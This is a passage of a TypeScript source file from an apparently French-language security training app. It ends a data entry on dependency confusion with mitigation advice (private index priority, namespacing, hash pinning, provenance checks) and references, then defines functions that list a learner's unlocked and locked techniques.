    antiHack: "1. **Index privé prioritaire et exclusif** : ne pas mélanger source privée et publique pour les packages internes. pip : préférer `--index-url` (privé) + pull-through proxy contrôlé plutôt que `--extra-index-url` qui agrège.\n2. **Scoping / namespacing** : npm `@yourorg/pkg` ; côté Python, réserver les noms de tes packages internes sur PyPI public (placeholder) pour empêcher le squat.\n3. **Pinning + hashes** : `--require-hashes`, lockfile committé → une version publique surgie « plus haute » ne sera pas tirée.\n4. **Repository manager** (Artifactory/Nexus) configuré pour **résoudre l'interne avant l'externe** et bloquer les noms internes côté upstream public.\n5. **Vérif de provenance** : Trusted Publishing/OIDC, signatures (Sigstore), et alertes si un nom interne apparaît soudain sur l'index public.\n6. **Détection** : `pip-audit`/Socket.dev, et monitoring des publications publiques portant tes noms de packages.",
    ctfRef: "Alex Birsan — « Dependency Confusion » (2021) ; OWASP / OpenSSF guidance",
    cve: "Classe d'attaque (CWE-427 substitution) — pas de CVE unique ; cf. recherche Birsan 2021",
    youtubeSearch: "dependency confusion attack Alex Birsan npm pip explained",
  },
];

export function getUnlockedTechniques(
  currentModuleNumber: number,
): CodeNoirTechnique[] {
  return CODE_NOIR_TECHNIQUES.filter(
    (t) => t.moduleNumber <= currentModuleNumber,
  );
}

export function getLockedTechniques(
  currentModuleNumber: number,
): Array<Pick<CodeNoirTechnique, "slug" | "title" | "moduleNumber" | "kind">> {
  return CODE_NOIR_TECHNIQUES.filter(
    (t) => t.moduleNumber > currentModuleNumber,
  ).map((t) => ({
    slug: t.slug,
    title: t.title,
    moduleNumber: t.moduleNumber,
    kind: t.kind,
  }));
}
